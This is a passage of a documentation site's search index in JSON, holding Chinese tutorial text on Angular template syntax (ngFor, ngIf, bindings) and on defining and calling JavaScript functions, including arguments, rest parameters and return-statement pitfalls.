\u8be5\u5e94\u7528\u73b0\u5728\u5177\u6709\u5546\u54c1\u5217\u8868\u548c\u5171\u4eab\u529f\u80fd\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u5df2\u7ecf\u5b66\u4f1a\u4e86 Angular \u6a21\u677f\u8bed\u6cd5\u7684\u4e94\u4e2a\u5e38\u7528\u7279\u6027\uff1a *ngFor *ngIf \u63d2\u503c\u8868\u8fbe\u5f0f \u5c5e\u6027\u7ed1\u5b9a [] \u4e8b\u4ef6\u7ed1\u5b9a ()","title":"ng\u5b98\u65b9\u6587\u6863\u5165\u95e8\u624b\u518c"},{"location":"language/javascript/ng1/#ng","text":"","title":"ng\u5b98\u65b9\u6587\u6863\u5165\u95e8\u624b\u518c"},{"location":"language/javascript/ng1/#_1","text":"\u70b9\u6b64\u5728 StackBlitz \u4e0a\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee \u7528 StackBlitz \u521b\u5efa\u4e00\u4e2a\u5165\u95e8\u7ea7 Angular \u5e94\u7528\u3002\u6211\u4eec\u5df2\u7ecf\u4e3a\u8fd9\u4e2a\u5e94\u7528\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5305\u542b\u5546\u5e97\u540d\u79f0\u548c\u7ed3\u5e10\u56fe\u6807\u7684\u9876\u680f\uff0c\u4ee5\u53ca\u5546\u54c1\u5217\u8868\u7684\u6807\u9898\u3002","title":"\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee"},{"location":"language/javascript/ng1/#_2","text":"Angular \u7684\u6a21\u677f\u8bed\u6cd5\u6269\u5c55\u4e86 HTML \u548c JavaScript\u3002 \u5728 product-list \u6587\u4ef6\u5939\u4e2d\uff0c\u6253\u5f00\u6a21\u677f\u6587\u4ef6 product-list.component.html \u3002 \u4fee\u6539\u5546\u54c1\u5217\u8868\u6a21\u677f\uff0c\u770b\u662f\u5426\u5217\u51fa\u4e86\u5546\u54c1\u540d\u79f0\u3002 \u6211\u4eec\u5e0c\u671b\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u5546\u54c1\u80fd\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u5728\u9875\u9762\u4e0a\u6328\u4e2a\u663e\u793a\u51fa\u6765\u3002\u8981\u904d\u5386\u8fd9\u4e9b\u9884\u5b9a\u4e49\u7684\u5546\u54c1\u5217\u8868\uff0c\u8bf7\u4f7f\u7528 *ngFor \u6307\u4ee4\u3002\u628a *ngFor \u6307\u4ee4\u52a0\u5230 <div> \u4e0a\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 1 2 3 4 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < /div> *ngFor \u4f1a\u5bfc\u81f4 <div> \u88ab\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u5546\u54c1\u90fd\u91cd\u590d\u6e32\u67d3\u4e00\u6b21\u3002 *ngFor \u662f\u4e00\u4e2a \"\u7ed3\u6784\u578b\u6307\u4ee4\"\u3002\u7ed3\u6784\u578b\u6307\u4ee4\u4f1a\u901a\u8fc7\u6dfb\u52a0\u3001\u5220\u9664\u548c\u64cd\u7eb5\u5b83\u4eec\u7684\u5bbf\u4e3b\u5143\u7d20\u7b49\u65b9\u5f0f\u5851\u9020\u6216\u91cd\u5851 DOM \u7684\u7ed3\u6784\u3002\u4efb\u4f55\u5e26\u6709 * \u7684\u6307\u4ee4\u90fd\u662f\u7ed3\u6784\u578b\u6307\u4ee4\u3002 \u8981\u663e\u793a\u5546\u54c1\u7684\u540d\u79f0\uff0c\u8bf7\u4f7f\u7528\u63d2\u503c\u8bed\u6cd5 \u3002\u63d2\u503c\u4f1a\u628a\u5c5e\u6027\u7684\u503c\u4f5c\u4e3a\u6587\u672c\u6e32\u67d3\u51fa\u6765\u3002\u5728 <div> \u91cc\u9762\uff0c\u6dfb\u52a0\u4e00\u4e2a <h3> \u6807\u9898\u6765\u663e\u793a\u5546\u54c1 name \u5c5e\u6027\u7684\u63d2\u503c\uff1a 1 2 3 4 5 6 7 8 9 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > {{ product . name }} < /h3> < /div> \u9884\u89c8\u7a97\u683c\u4f1a\u7acb\u5373\u66f4\u65b0\uff0c\u4ee5\u663e\u793a\u5217\u8868\u4e2d\u6bcf\u4e2a\u5546\u54c1\u7684\u540d\u79f0\u3002 \u5728\u6700\u7ec8\u7684\u5e94\u7528\u4e2d\uff0c\u6bcf\u4e2a\u5546\u54c1\u540d\u79f0\u90fd\u4f1a\u94fe\u63a5\u5230\u5546\u54c1\u8be6\u60c5\u3002\u73b0\u5728\u6dfb\u52a0\u8fd9\u4e2a\u94fe\u63a5\uff0c\u5e76\u4f7f\u7528\u5c5e\u6027\u7ed1\u5b9a\u8bed\u6cd5 [] \u628a\u8be5\u94fe\u63a5\u7684 title \u8bbe\u7f6e\u6210\u8be5\u5546\u54c1\u7684\u540d\u5b57\uff0c\u5982\u4e0b\u6240\u793a: 1 2 3 4 5 6 7 8 9 10 11 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < /div> \u5728\u9884\u89c8\u7a97\u683c\u4e2d\uff0c\u5c06\u9f20\u6807\u60ac\u505c\u5728\u663e\u793a\u7684\u5546\u54c1\u540d\u79f0\u4e0a\uff0c\u53ef\u4ee5\u770b\u5230\u7ed1\u5b9a\u7684 name \u5c5e\u6027\u503c\u3002\u5b83\u4eec\u4fe9\u662f\u4e00\u6837\u7684\u3002\u63d2\u503c\u8868\u8fbe\u5f0f \u5141\u8bb8\u4f60\u628a\u5c5e\u6027\u503c\u6e32\u67d3\u4e3a\u6587\u672c\uff1b\u800c\u5c5e\u6027\u7ed1\u5b9a\u8bed\u6cd5 [] \u5219\u5141\u8bb8\u4f60\u5728\u6a21\u677f\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5c5e\u6027\u503c\u3002 \u6dfb\u52a0\u5546\u54c1\u8bf4\u660e\u3002\u5728 p \u6807\u7b7e\u4e0a\uff0c\u4f7f\u7528 *ngIf \u6307\u4ee4\uff0c\u8fd9\u6837\u624d\u80fd\u5728\u5f53\u524d\u5546\u54c1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u521b\u5efa\u8fd9\u4e2a p \u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < p * ngIf = \"product.description\" > Description : {{ product . description }} < /p> < /div> \u8be5\u5e94\u7528\u4f1a\u7acb\u5373\u5728\u5217\u8868\u4e2d\u663e\u793a\u6bcf\u79cd\u5546\u54c1\u7684\u540d\u79f0\u548c\u63cf\u8ff0\uff0c\u5982\u4e0b\u6240\u793a\u3002\u8bf7\u6ce8\u610f\uff0c\u6700\u540e\u4e00\u4e2a\u5546\u54c1\u6839\u672c\u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u3002\u7531\u4e8e\u8be5\u5546\u54c1\u7684 description \u5c5e\u6027\u4e3a\u7a7a\uff0c\u56e0\u6b64\u4e0d\u4f1a\u521b\u5efa p \u5143\u7d20\uff08\u5305\u62ec\u9759\u6001\u6587\u672c \u201cDescription\u201d\uff09\u3002 \u6dfb\u52a0\u4e00\u4e2a\u6309\u94ae\uff0c\u4ee5\u4fbf\u8ba9\u7528\u6237\u53ef\u4e0e\u670b\u53cb\u5206\u4eab\u5546\u54c1\u3002\u628a button \u7684 click \u4e8b\u4ef6\u7ed1\u5b9a\u5230\u6211\u4eec\u66ff\u4f60\u5b9a\u4e49\u597d\u7684 share() \u4e8b\u4ef6\u4e0a\uff08\u4f4d\u4e8e product-list.component.ts \uff09\u3002\u4e8b\u4ef6\u7ed1\u5b9a\u662f\u901a\u8fc7\u628a\u4e8b\u4ef6\u540d\u79f0\u5305\u88f9\u5728\u5706\u62ec\u53f7 () \u4e2d\u5b8c\u6210\u7684\uff0c\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < p * ngIf = \"product.description\" > Description : {{ product . description }} < /p> < button ( click ) = \"share()\" > Share < /button> < /div> \u73b0\u5728\uff0c\u6bcf\u4e2a\u5546\u54c1\u90fd\u6709\u4e00\u4e2a \u201cShare\u201d \u6309\u94ae\u4e86\uff1a \u8be5\u5e94\u7528\u73b0\u5728\u5177\u6709\u5546\u54c1\u5217\u8868\u548c\u5171\u4eab\u529f\u80fd\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u5df2\u7ecf\u5b66\u4f1a\u4e86 Angular \u6a21\u677f\u8bed\u6cd5\u7684\u4e94\u4e2a\u5e38\u7528\u7279\u6027\uff1a *ngFor *ngIf \u63d2\u503c\u8868\u8fbe\u5f0f \u5c5e\u6027\u7ed1\u5b9a [] \u4e8b\u4ef6\u7ed1\u5b9a ()","title":"\u6a21\u677f\u8bed\u6cd5"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/","text":"\u51fd\u6570\u5b9a\u4e49\u548c\u8c03\u7528 \u00b6 1 2 3 4 5 6 7 function abs ( x ) { if ( x >= 0 ) { return x ; } else { return - x ; } } \u4e0a\u8ff0 abs() \u51fd\u6570\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a function \u6307\u51fa\u8fd9\u662f\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\uff1b abs \u662f\u51fd\u6570\u7684\u540d\u79f0\uff1b (x) \u62ec\u53f7\u5185\u5217\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53c2\u6570\u4ee5 , \u5206\u9694\uff1b { ... } \u4e4b\u95f4\u7684\u4ee3\u7801\u662f\u51fd\u6570\u4f53\uff0c\u53ef\u4ee5\u5305\u542b\u82e5\u5e72\u8bed\u53e5\uff0c\u751a\u81f3\u53ef\u4ee5\u6ca1\u6709\u4efb\u4f55\u8bed\u53e5\u3002 \u8bf7\u6ce8\u610f\uff0c\u51fd\u6570\u4f53\u5185\u90e8\u7684\u8bed\u53e5\u5728\u6267\u884c\u65f6\uff0c\u4e00\u65e6\u6267\u884c\u5230 return \u65f6\uff0c\u51fd\u6570\u5c31\u6267\u884c\u5b8c\u6bd5\uff0c\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u3002\u56e0\u6b64\uff0c\u51fd\u6570\u5185\u90e8\u901a\u8fc7\u6761\u4ef6\u5224\u65ad\u548c\u5faa\u73af\u53ef\u4ee5\u5b9e\u73b0\u975e\u5e38\u590d\u6742\u7684\u903b\u8f91\u3002 \u5982\u679c\u6ca1\u6709 return \u8bed\u53e5\uff0c\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u540e\u4e5f\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u53ea\u662f\u7ed3\u679c\u4e3a undefined \u3002 \u7531\u4e8eJavaScript\u7684\u51fd\u6570\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e0a\u8ff0\u5b9a\u4e49\u7684 abs() \u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u51fd\u6570\u5bf9\u8c61\uff0c\u800c\u51fd\u6570\u540d abs \u53ef\u4ee5\u89c6\u4e3a\u6307\u5411\u8be5\u51fd\u6570\u7684\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u7b2c\u4e8c\u79cd\u5b9a\u4e49\u51fd\u6570\u7684\u65b9\u5f0f\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 var abs = function ( x ) { if ( x >= 0 ) { return x ; } else { return - x ; } }; \u5728\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0c function (x) { ... } \u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u5b83\u6ca1\u6709\u51fd\u6570\u540d\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u4e86\u53d8\u91cf abs \uff0c\u6240\u4ee5\uff0c\u901a\u8fc7\u53d8\u91cf abs \u5c31\u53ef\u4ee5\u8c03\u7528\u8be5\u51fd\u6570\u3002 \u4e0a\u8ff0\u4e24\u79cd\u5b9a\u4e49 \u5b8c\u5168\u7b49\u4ef7 \uff0c\u6ce8\u610f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u6309\u7167\u5b8c\u6574\u8bed\u6cd5\u9700\u8981\u5728\u51fd\u6570\u4f53\u672b\u5c3e\u52a0\u4e00\u4e2a ; \uff0c\u8868\u793a\u8d4b\u503c\u8bed\u53e5\u7ed3\u675f\u3002 \u8c03\u7528\u51fd\u6570 \u00b6 \u8c03\u7528\u51fd\u6570\u65f6\uff0c\u6309\u987a\u5e8f\u4f20\u5165\u53c2\u6570\u5373\u53ef\uff1a 1 2 abs(10); // \u8fd4\u56de10 abs(-9); // \u8fd4\u56de9 \u7531\u4e8eJavaScript\u5141\u8bb8\u4f20\u5165\u4efb\u610f\u4e2a\u53c2\u6570\u800c\u4e0d\u5f71\u54cd\u8c03\u7528\uff0c\u56e0\u6b64\u4f20\u5165\u7684\u53c2\u6570\u6bd4\u5b9a\u4e49\u7684\u53c2\u6570\u591a\u4e5f\u6ca1\u6709\u95ee\u9898\uff0c\u867d\u7136\u51fd\u6570\u5185\u90e8\u5e76\u4e0d\u9700\u8981\u8fd9\u4e9b\u53c2\u6570\uff1a 1 2 abs(10, 'blablabla'); // \u8fd4\u56de10 abs(-9, 'haha', 'hehe', null); // \u8fd4\u56de9 \u4f20\u5165\u7684\u53c2\u6570\u6bd4\u5b9a\u4e49\u7684\u5c11\u4e5f\u6ca1\u6709\u95ee\u9898\uff1a 1 abs(); // \u8fd4\u56deNaN \u6b64\u65f6 abs(x) \u51fd\u6570\u7684\u53c2\u6570 x \u5c06\u6536\u5230 undefined \uff0c\u8ba1\u7b97\u7ed3\u679c\u4e3a NaN \u3002 \u8981\u907f\u514d\u6536\u5230 undefined \uff0c\u53ef\u4ee5\u5bf9\u53c2\u6570\u8fdb\u884c\u68c0\u67e5\uff1a 1 2 3 4 5 6 7 8 9 10 function abs ( x ) { if ( typeof x !== 'number' ) { throw 'Not a number' ; } if ( x >= 0 ) { return x ; } else { return - x ; } } arguments \u00b6 JavaScript\u8fd8\u6709\u4e00\u4e2a\u514d\u8d39\u8d60\u9001\u7684\u5173\u952e\u5b57 arguments \uff0c\u5b83\u53ea\u5728\u51fd\u6570\u5185\u90e8\u8d77\u4f5c\u7528\uff0c\u5e76\u4e14\u6c38\u8fdc\u6307\u5411\u5f53\u524d\u51fd\u6570\u7684\u8c03\u7528\u8005\u4f20\u5165\u7684\u6240\u6709\u53c2\u6570\u3002 arguments \u7c7b\u4f3c Array \u4f46\u5b83\u4e0d\u662f\u4e00\u4e2a Array \uff1a 1 2 3 4 5 6 7 function foo ( x ) { console . log ( 'x = ' + x ); // 10 for ( var i = 0 ; i < arguments . length ; i ++ ) { console . log ( 'arg ' + i + ' = ' + arguments [ i ]); // 10, 20, 30 } } foo ( 10 , 20 , 30 ); \u5229\u7528 arguments \uff0c\u4f60\u53ef\u4ee5\u83b7\u5f97\u8c03\u7528\u8005\u4f20\u5165\u7684\u6240\u6709\u53c2\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5373\u4f7f\u51fd\u6570\u4e0d\u5b9a\u4e49\u4efb\u4f55\u53c2\u6570\uff0c\u8fd8\u662f\u53ef\u4ee5\u62ff\u5230\u53c2\u6570\u7684\u503c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function abs() { if (arguments.length === 0) { return 0; } var x = arguments[0]; return x >= 0 ? x : -x; } abs(); // 0 abs(10); // 10 abs(-9); // 9 \u5b9e\u9645\u4e0a arguments \u6700\u5e38\u7528\u4e8e\u5224\u65ad\u4f20\u5165\u53c2\u6570\u7684\u4e2a\u6570\u3002\u4f60\u53ef\u80fd\u4f1a\u770b\u5230\u8fd9\u6837\u7684\u5199\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 // foo(a[, b], c) // \u63a5\u65362~3\u4e2a\u53c2\u6570\uff0cb\u662f\u53ef\u9009\u53c2\u6570\uff0c\u5982\u679c\u53ea\u4f202\u4e2a\u53c2\u6570\uff0cb\u9ed8\u8ba4\u4e3anull\uff1a function foo ( a , b , c ) { if ( arguments . length === 2 ) { // \u5b9e\u9645\u62ff\u5230\u7684\u53c2\u6570\u662fa\u548cb\uff0cc\u4e3aundefined c = b ; // \u628ab\u8d4b\u7ed9c b = null ; // b\u53d8\u4e3a\u9ed8\u8ba4\u503c } // ... } \u8981\u628a\u4e2d\u95f4\u7684\u53c2\u6570 b \u53d8\u4e3a\u201c\u53ef\u9009\u201d\u53c2\u6570\uff0c\u5c31\u53ea\u80fd\u901a\u8fc7 arguments \u5224\u65ad\uff0c\u7136\u540e\u91cd\u65b0\u8c03\u6574\u53c2\u6570\u5e76\u8d4b\u503c\u3002 rest\u53c2\u6570 \u00b6 ES6\u6807\u51c6\u5f15\u5165\u4e86rest\u53c2\u6570\uff0c\u4e0a\u9762\u7684\u51fd\u6570\u53ef\u4ee5\u6539\u5199\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function foo ( a , b , ... rest ) { console . log ( 'a = ' + a ); console . log ( 'b = ' + b ); console . log ( rest ); } foo ( 1 , 2 , 3 , 4 , 5 ); // \u7ed3\u679c: // a = 1 // b = 2 // Array [ 3, 4, 5 ] foo ( 1 ); // \u7ed3\u679c: // a = 1 // b = undefined // Array [] rest\u53c2\u6570\u53ea\u80fd\u5199\u5728\u6700\u540e\uff0c\u524d\u9762\u7528 ... \u6807\u8bc6\uff0c\u4ece\u8fd0\u884c\u7ed3\u679c\u53ef\u77e5\uff0c\u4f20\u5165\u7684\u53c2\u6570\u5148\u7ed1\u5b9a a \u3001 b \uff0c\u591a\u4f59\u7684\u53c2\u6570\u4ee5\u6570\u7ec4\u5f62\u5f0f\u4ea4\u7ed9\u53d8\u91cf rest \uff0c\u6240\u4ee5\uff0c\u4e0d\u518d\u9700\u8981 arguments \u6211\u4eec\u5c31\u83b7\u53d6\u4e86\u5168\u90e8\u53c2\u6570\u3002 \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u8fde\u6b63\u5e38\u5b9a\u4e49\u7684\u53c2\u6570\u90fd\u6ca1\u586b\u6ee1\uff0c\u4e5f\u4e0d\u8981\u7d27\uff0crest\u53c2\u6570\u4f1a\u63a5\u6536\u4e00\u4e2a\u7a7a\u6570\u7ec4\uff08\u6ce8\u610f\u4e0d\u662f undefined \uff09\u3002 return \u8bed\u53e5 \u00b6 1 2 3 4 5 function foo () { return { name : 'foo' }; } foo (); // { name: 'foo' } \u5982\u679c\u628areturn\u8bed\u53e5\u62c6\u6210\u4e24\u884c\uff1a 1 2 3 4 5 6 function foo () { return { name : 'foo' }; } foo (); // undefined \u8981\u5c0f\u5fc3\u4e86 \uff0c\u7531\u4e8eJavaScript\u5f15\u64ce\u5728\u884c\u672b\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u673a\u5236\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5b9e\u9645\u4e0a\u53d8\u6210\u4e86\uff1a 1 2 3 4 function foo () { return ; // \u81ea\u52a8\u6dfb\u52a0\u4e86\u5206\u53f7\uff0c\u76f8\u5f53\u4e8ereturn undefined; { name : 'foo' }; // \u8fd9\u884c\u8bed\u53e5\u5df2\u7ecf\u6ca1\u6cd5\u6267\u884c\u5230\u4e86 } \u6240\u4ee5\u6b63\u786e\u7684\u591a\u884c\u5199\u6cd5\u662f\uff1a 1 2 3 4 5 function foo () { return { // \u8fd9\u91cc\u4e0d\u4f1a\u81ea\u52a8\u52a0\u5206\u53f7\uff0c\u56e0\u4e3a{\u8868\u793a\u8bed\u53e5\u5c1a\u672a\u7ed3\u675f name : 'foo' }; }","title":"\u51fd\u6570\u5b9a\u4e49\u548c\u8c03\u7528"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/#_1","text":"1 2 3 4 5 6 7 function abs ( x ) { if ( x >= 0 ) { return x ; } else { return - x ; } } \u4e0a\u8ff0 abs() \u51fd\u6570\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a function \u6307\u51fa\u8fd9\u662f\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\uff1b abs \u662f\u51fd\u6570\u7684\u540d\u79f0\uff1b (x) \u62ec\u53f7\u5185\u5217\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53c2\u6570\u4ee5 , \u5206\u9694\uff1b { ... } \u4e4b\u95f4\u7684\u4ee3\u7801\u662f\u51fd\u6570\u4f53\uff0c\u53ef\u4ee5\u5305\u542b\u82e5\u5e72\u8bed\u53e5\uff0c\u751a\u81f3\u53ef\u4ee5\u6ca1\u6709\u4efb\u4f55\u8bed\u53e5\u3002 \u8bf7\u6ce8\u610f\uff0c\u51fd\u6570\u4f53\u5185\u90e8\u7684\u8bed\u53e5\u5728\u6267\u884c\u65f6\uff0c\u4e00\u65e6\u6267\u884c\u5230 return \u65f6\uff0c\u51fd\u6570\u5c31\u6267\u884c\u5b8c\u6bd5\uff0c\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u3002\u56e0\u6b64\uff0c\u51fd\u6570\u5185\u90e8\u901a\u8fc7\u6761\u4ef6\u5224\u65ad\u548c\u5faa\u73af\u53ef\u4ee5\u5b9e\u73b0\u975e\u5e38\u590d\u6742\u7684\u903b\u8f91\u3002 \u5982\u679c\u6ca1\u6709 return \u8bed\u53e5\uff0c\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u540e\u4e5f\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u53ea\u662f\u7ed3\u679c\u4e3a undefined \u3002 \u7531\u4e8eJavaScript\u7684\u51fd\u6570\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e0a\u8ff0\u5b9a\u4e49\u7684 abs() \u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u51fd\u6570\u5bf9\u8c61\uff0c\u800c\u51fd\u6570\u540d abs \u53ef\u4ee5\u89c6\u4e3a\u6307\u5411\u8be5\u51fd\u6570\u7684\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u7b2c\u4e8c\u79cd\u5b9a\u4e49\u51fd\u6570\u7684\u65b9\u5f0f\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 var abs = function ( x ) { if ( x >= 0 ) { return x ; } else { return - x ; } }; \u5728\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0c function (x) { ... } \u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u5b83\u6ca1\u6709\u51fd\u6570\u540d\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u4e86\u53d8\u91cf abs \uff0c\u6240\u4ee5\uff0c\u901a\u8fc7\u53d8\u91cf abs \u5c31\u53ef\u4ee5\u8c03\u7528\u8be5\u51fd\u6570\u3002 \u4e0a\u8ff0\u4e24\u79cd\u5b9a\u4e49 \u5b8c\u5168\u7b49\u4ef7 \uff0c\u6ce8\u610f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u6309\u7167\u5b8c\u6574\u8bed\u6cd5\u9700\u8981\u5728\u51fd\u6570\u4f53\u672b\u5c3e\u52a0\u4e00\u4e2a ; \uff0c\u8868\u793a\u8d4b\u503c\u8bed\u53e5\u7ed3\u675f\u3002","title":"\u51fd\u6570\u5b9a\u4e49\u548c\u8c03\u7528"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/#_2","text":"\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u6309\u987a\u5e8f\u4f20\u5165\u53c2\u6570\u5373\u53ef\uff1a 1 2 abs(10); // \u8fd4\u56de10 abs(-9); // \u8fd4\u56de9 \u7531\u4e8eJavaScript\u5141\u8bb8\u4f20\u5165\u4efb\u610f\u4e2a\u53c2\u6570\u800c\u4e0d\u5f71\u54cd\u8c03\u7528\uff0c\u56e0\u6b64\u4f20\u5165\u7684\u53c2\u6570\u6bd4\u5b9a\u4e49\u7684\u53c2\u6570\u591a\u4e5f\u6ca1\u6709\u95ee\u9898\uff0c\u867d\u7136\u51fd\u6570\u5185\u90e8\u5e76\u4e0d\u9700\u8981\u8fd9\u4e9b\u53c2\u6570\uff1a 1 2 abs(10, 'blablabla'); // \u8fd4\u56de10 abs(-9, 'haha', 'hehe', null); // \u8fd4\u56de9 \u4f20\u5165\u7684\u53c2\u6570\u6bd4\u5b9a\u4e49\u7684\u5c11\u4e5f\u6ca1\u6709\u95ee\u9898\uff1a 1 abs(); // \u8fd4\u56deNaN \u6b64\u65f6 abs(x) \u51fd\u6570\u7684\u53c2\u6570 x \u5c06\u6536\u5230 undefined \uff0c\u8ba1\u7b97\u7ed3\u679c\u4e3a NaN \u3002 \u8981\u907f\u514d\u6536\u5230 undefined \uff0c\u53ef\u4ee5\u5bf9\u53c2\u6570\u8fdb\u884c\u68c0\u67e5\uff1a 1 2 3 4 5 6 7 8 9 10 function abs ( x ) { if ( typeof x !== 'number' ) { throw 'Not a number' ; } if ( x >= 0 ) { return x ; } else { return - x ; } }","title":"\u8c03\u7528\u51fd\u6570"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/#arguments","text":"JavaScript\u8fd8\u6709\u4e00\u4e2a\u514d\u8d39\u8d60\u9001\u7684\u5173\u952e\u5b57 arguments \uff0c\u5b83\u53ea\u5728\u51fd\u6570\u5185\u90e8\u8d77\u4f5c\u7528\uff0c\u5e76\u4e14\u6c38\u8fdc\u6307\u5411\u5f53\u524d\u51fd\u6570\u7684\u8c03\u7528\u8005\u4f20\u5165\u7684\u6240\u6709\u53c2\u6570\u3002 arguments \u7c7b\u4f3c Array \u4f46\u5b83\u4e0d\u662f\u4e00\u4e2a Array \uff1a 1 2 3 4 5 6 7 function foo ( x ) { console . log ( 'x = ' + x ); // 10 for ( var i = 0 ; i < arguments . length ; i ++ ) { console . log ( 'arg ' + i + ' = ' + arguments [ i ]); // 10, 20, 30 } } foo ( 10 , 20 , 30 ); \u5229\u7528 arguments \uff0c\u4f60\u53ef\u4ee5\u83b7\u5f97\u8c03\u7528\u8005\u4f20\u5165\u7684\u6240\u6709\u53c2\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5373\u4f7f\u51fd\u6570\u4e0d\u5b9a\u4e49\u4efb\u4f55\u53c2\u6570\uff0c\u8fd8\u662f\u53ef\u4ee5\u62ff\u5230\u53c2\u6570\u7684\u503c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function abs() { if (arguments.length === 0) { return 0; } var x = arguments[0]; return x >= 0 ? x : -x; } abs(); // 0 abs(10); // 10 abs(-9); // 9 \u5b9e\u9645\u4e0a arguments \u6700\u5e38\u7528\u4e8e\u5224\u65ad\u4f20\u5165\u53c2\u6570\u7684\u4e2a\u6570\u3002\u4f60\u53ef\u80fd\u4f1a\u770b\u5230\u8fd9\u6837\u7684\u5199\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 // foo(a[, b], c) // \u63a5\u65362~3\u4e2a\u53c2\u6570\uff0cb\u662f\u53ef\u9009\u53c2\u6570\uff0c\u5982\u679c\u53ea\u4f202\u4e2a\u53c2\u6570\uff0cb\u9ed8\u8ba4\u4e3anull\uff1a function foo ( a , b , c ) { if ( arguments . length === 2 ) { // \u5b9e\u9645\u62ff\u5230\u7684\u53c2\u6570\u662fa\u548cb\uff0cc\u4e3aundefined c = b ; // \u628ab\u8d4b\u7ed9c b = null ; // b\u53d8\u4e3a\u9ed8\u8ba4\u503c } // ... } \u8981\u628a\u4e2d\u95f4\u7684\u53c2\u6570 b \u53d8\u4e3a\u201c\u53ef\u9009\u201d\u53c2\u6570\uff0c\u5c31\u53ea\u80fd\u901a\u8fc7 arguments \u5224\u65ad\uff0c\u7136\u540e\u91cd\u65b0\u8c03\u6574\u53c2\u6570\u5e76\u8d4b\u503c\u3002","title":"arguments"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/#rest","text":"ES6\u6807\u51c6\u5f15\u5165\u4e86rest\u53c2\u6570\uff0c\u4e0a\u9762\u7684\u51fd\u6570\u53ef\u4ee5\u6539\u5199\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function foo ( a , b , ... rest ) { console . log ( 'a = ' + a ); console . log ( 'b = ' + b ); console . log ( rest ); } foo ( 1 , 2 , 3 , 4 , 5 ); // \u7ed3\u679c: // a = 1 // b = 2 // Array [ 3, 4, 5 ] foo ( 1 ); // \u7ed3\u679c: // a = 1 // b = undefined // Array [] rest\u53c2\u6570\u53ea\u80fd\u5199\u5728\u6700\u540e\uff0c\u524d\u9762\u7528 ... \u6807\u8bc6\uff0c\u4ece\u8fd0\u884c\u7ed3\u679c\u53ef\u77e5\uff0c\u4f20\u5165\u7684\u53c2\u6570\u5148\u7ed1\u5b9a a \u3001 b 